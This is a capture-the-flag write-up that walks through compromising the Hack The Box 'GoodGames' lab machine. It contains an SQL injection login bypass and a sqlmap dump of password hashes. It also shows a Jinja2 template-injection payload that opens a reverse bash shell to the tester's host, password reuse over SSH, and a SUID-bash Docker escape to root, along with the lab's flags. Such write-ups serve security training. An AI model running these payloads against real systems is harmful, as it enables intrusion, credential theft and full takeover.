# GoodGames Writeup - User & Root

> Team: UMDCSEC <br />
> Author: artemis19
--------------------

## Enumeration

First I ran an all ports scan on the host:

```bash
nmap -p- -Pn -oN goodgames_allports.txt 10.129.230.199
Nmap scan report for 10.129.230.199
Host is up (0.027s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  http
```

Then I performed service enumeration scans with some default scripts:

```bash
nmap -Pn -p80 -sC -sV -oN goodgame_services.txt 10.129.230.199
Nmap scan report for 10.129.230.199
Host is up (0.022s latency).

PORT   STATE SERVICE  VERSION
80/tcp open  ssl/http Werkzeug/2.0.2 Python/3.9.2
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
|_http-title: GoodGames | Community and Store
```

Since it seemed like the only vector was through http, I navigated to http://10.129.230.199/.

## GoodGames Website - SQLi

After clicking around on the website, I saw that there was a login form posting to `/login`. I started trying different basic SQL injection queries in both the password and email fields, ultimately determining that the email field was vulnerable. Since the form was also performing a check on the email input, I had to remove the `type=email` option in the form through Developer Tools. Upon doing that, I was able to run the below and log in:

```sql
' OR 1=1 #
```

My profile detailed that I was logged in as the user `Nick` who was an admin.

```
Nick: admin
Email: admin@goodgames.htb
Date joined: NULL 
```

After clicking around, I clicked on the gear icon in the top right corner and was redirected to http://internal-administration.goodgames.htb/login which didn't load at first. I had to then add it to my `/etc/hosts` file to see that it was an open-source Flask portal page. Since I didn't have actual credentials to log in, I turned to `sqlmap` to dump all of the GoodGames website users.

I used the below query to dump the `user` table in the `main` mysql database.

```bash
/opt/sqlmap/sqlmap.py -u http://10.129.230.231/login --data='email=&password=' -D main -T user --columns --dbms=mysql --dump

```

The dump resulted in the following users and MD5 password hashes being revealed:

```
id	name	email	password
1	admin	admin@goodgames.htb	2b22337f218b2d82dfc3b6f77e7cb8ec
2	test	test@test.com	098f6bcd4621d373cade4e832627b4f6 (test)
```

I looked up `2b22337f218b2d82dfc3b6f77e7cb8ec` on CrackStation (https://crackstation.net/) which showed me that the `admin` password was `superadministrator`. I was then able to log in to the internal administration website.

## Internal Administration Website - Flask SSTI

I noticed that most of the website had zero functionality with exception to the "My Profile" tab. Since this was a Flask website, I turned to a known vulnerability called Server-Side Template Injection (SSTI) to see if the website was vulnerable. I noticed that the "Full Name" option allowed me to input text, so I tried a simple command to test for the vulnerability:

```
{{ '7'*7 }}
```

I got the result of `7777777` in the right hand side for the `admin` user profile information, telling me that had code injection for the Jinja2 templates on the flask server.

I used the following resource to test different payloads: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2.

First I some of the Jinja2 global variables such as `config` to see what the application was using.

```python
{{ config.items() }}

dict_items([('ENV', 'production'), ('DEBUG', False), ('TESTING', False), ('PROPAGATE_EXCEPTIONS', None), ('PRESERVE_CONTEXT_ON_EXCEPTION', None), ('SECRET_KEY', 'S3cr3t_K#Key'), ('PERMANENT_SESSION_LIFETIME', datetime.timedelta(31)), ('USE_X_SENDFILE', False), ('SERVER_NAME', None), ('APPLICATION_ROOT', '/'), ('SESSION_COOKIE_NAME', 'session'), ('SESSION_COOKIE_DOMAIN', False), ('SESSION_COOKIE_PATH', None), ('SESSION_COOKIE_HTTPONLY', True), ('SESSION_COOKIE_SECURE', False), ('SESSION_COOKIE_SAMESITE', None), ('SESSION_REFRESH_EACH_REQUEST', True), ('MAX_CONTENT_LENGTH', None), ('SEND_FILE_MAX_AGE_DEFAULT', None), ('TRAP_BAD_REQUEST_ERRORS', None), ('TRAP_HTTP_EXCEPTIONS', False), ('EXPLAIN_TEMPLATE_LOADING', False), ('PREFERRED_URL_SCHEME', 'http'), ('JSON_AS_ASCII', True), ('JSON_SORT_KEYS', True), ('JSONIFY_PRETTYPRINT_REGULAR', False), ('JSONIFY_MIMETYPE', 'application/json'), ('TEMPLATES_AUTO_RELOAD', None), ('MAX_COOKIE_SIZE', 4093), ('SQLALCHEMY_DATABASE_URI', 'sqlite:////backend/project/apps/db.sqlite3'), ('SQLALCHEMY_TRACK_MODIFICATIONS', False), ('SQLALCHEMY_BINDS', None), ('SQLALCHEMY_NATIVE_UNICODE', None), ('SQLALCHEMY_ECHO', False), ('SQLALCHEMY_RECORD_QUERIES', None), ('SQLALCHEMY_POOL_SIZE', None), ('SQLALCHEMY_POOL_TIMEOUT', None), ('SQLALCHEMY_POOL_RECYCLE', None), ('SQLALCHEMY_MAX_OVERFLOW', None), ('SQLALCHEMY_COMMIT_ON_TEARDOWN', False), ('SQLALCHEMY_ENGINE_OPTIONS', {})])
```

I then wanted to see what classes were available within the application that I could potentially abuse.

```python
{{''.__class__.mro()[1].__subclasses__()}}
```

This gave me a large list which I sorted through and found `subprocess.Popen` at index 217. The `subprocess` module allows someone to issue arbirtrary commands, and the `Popen` command allows you to open a pipe and communicate through. This combination seemed like a potential way to initiate a reverse shell to get on the host.

```python
{{ ''.__class__.__mro__[1].__subclasses__()[217] }}

<class 'subprocess.Popen'> 
```

Then, using https://www.revshells.com/ I constructed the below command while having a listener set up on port 80 on my host to catch the call-back.

```python
{{ ''.__class__.__mro__[1].__subclasses__()[217]('/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.104/80 0>&1"',shell=True,stdout=-1,stderr=-1) }}
```

I get the following output in my listener:

```bash
sudo nc -lnvp 80
Listening on 0.0.0.0 80
Connection received on 10.129.230.199 60590
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@3a453ab39d3d:/backend# 
```

## User.txt - Docker Container Escape

I immediately navigated to `/home` and saw the `augustus` user with `user.txt` in their home directory.

```bash
root@3a453ab39d3d:/home/augustus# ls
user.txt
```

`user.txt: HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}`

I noticed that I was the `root` user, but it didn't seem like I was in a normal FS. After looking around, I found this in the `/` directory:

```bash
root@3a453ab39d3d:/# ls -la
ls -la
total 88
drwxr-xr-x   1 root root 4096 Nov  5 15:23 .
drwxr-xr-x   1 root root 4096 Nov  5 15:23 ..
-rwxr-xr-x   1 root root    0 Nov  5 15:23 .dockerenv
```

... telling me I was actually in a docker container. I tried using https://github.com/stealthcopter/deepce, but it didn't seem to find anything. After doing some manual enumeration, I noticed that my container had an internal IP. 

```bash
root@3a453ab39d3d:/backend# ifconfig
ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.19.0.2  netmask 255.255.0.0  broadcast 172.19.255.255
        ether 02:42:ac:13:00:02  txqueuelen 0  (Ethernet)
        RX packets 1700  bytes 311076 (303.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1362  bytes 598003 (583.9 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

I had a thought that since the `172.19.0.2` was the docker container IP that there might be something at the `172.19.0.1` address. Since I didn't have `nmap` or `nc` in the container, I opted to try and use `bash` to do a simple port scan on that IP.

I found this resource https://catonmat.net/tcp-port-scanner-in-bash to help me craft my port scanner.

```bash
for port in {1..1000}; do timeout 1 echo </dev/tcp/172.19.0.1/$port && echo "port $port is open" || echo "port $port is closed"; done;
```

I saw that most of the ports had `Connection refused`, but I did get the output `port 22 is open`, meaning I could likely `ssh` into the host at `172.19.0.1`. I hadn't found any passwords or other potential credentials in the container, so I decided to try the following with `augustus` as a user and the password `superadministrator` I had found earlier.

```bash
ssh augustus@172.19.0.1

The authenticity of host '172.19.0.1 (172.19.0.1)' can't be established.
ECDSA key fingerprint is SHA256:AvB4qtTxSVcB0PuHwoPV42/LAJ9TlyPVbd7G6Igzmj0.
Are you sure you want to continue connecting (yes/no)? yes
yes
Warning: Permanently added '172.19.0.1' (ECDSA) to the list of known hosts.
augustus@172.19.0.1's password: superadministrator

Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
augustus@GoodGames:~$ whoami
augustus
```

## Root.txt - Privilege Escalation

I noticed that `/home/augustus` was both on the docker container and the FS, but I was only a user on the host whereas I was `root` on docker container. I didn't see any useful SETUID binaries that I could abuse on the host, but I wondered if I could just make one myself... I first made a copy of the `bash` binary in the `/home/augustus` directory.

```bash
augustus@GoodGames:~$ which bash
/usr/bin/bash
augustus@GoodGames:~$ cp /usr/bin/bash .
augustus@GoodGames:~$ ls
bash  user.txt
```

I then went back to the docker container and ran the following commands as "root" to make my copy of `bash` owned by the root user & group and set the SETUID bit.

```bash
root@3a453ab39d3d:/home/augustus# chown root:root bash
root@3a453ab39d3d:/home/augustus# chmod +s bash
root@3a453ab39d3d:/home/augustus# ls -la
ls -la
total 1168
drwxr-xr-x 2 1000 1000    4096 Nov 21 23:46 .
drwxr-xr-x 1 root root    4096 Nov  5 15:23 ..
lrwxrwxrwx 1 root root       9 Nov  3 10:16 .bash_history -> /dev/null
-rw-r--r-- 1 1000 1000     220 Oct 19 11:16 .bash_logout
-rw-r--r-- 1 1000 1000    3526 Oct 19 11:16 .bashrc
-rw-r--r-- 1 1000 1000     807 Oct 19 11:16 .profile
-rwsr-sr-x 1 root root 1168776 Nov 21 23:46 bash
-rw-r----- 1 root 1000      32 Nov  3 10:13 user.txt
```

I then logged back into the host at `172.19.0.1` and used the trick shown here: https://gtfobins.github.io/gtfobins/bash/#suid for a SUID bit set on the `bash` binary.

```bash
augustus@GoodGames:~$ ./bash -p
bash-5.0# whoami
root
bash-5.0# cat /root/root.txt
HTB{M0un73d_F1l3_Sy57eM5_4r3_DaNg3R0uS}
```

`root.txt: HTB{M0un73d_F1l3_Sy57eM5_4r3_DaNg3R0uS}`

Rooted!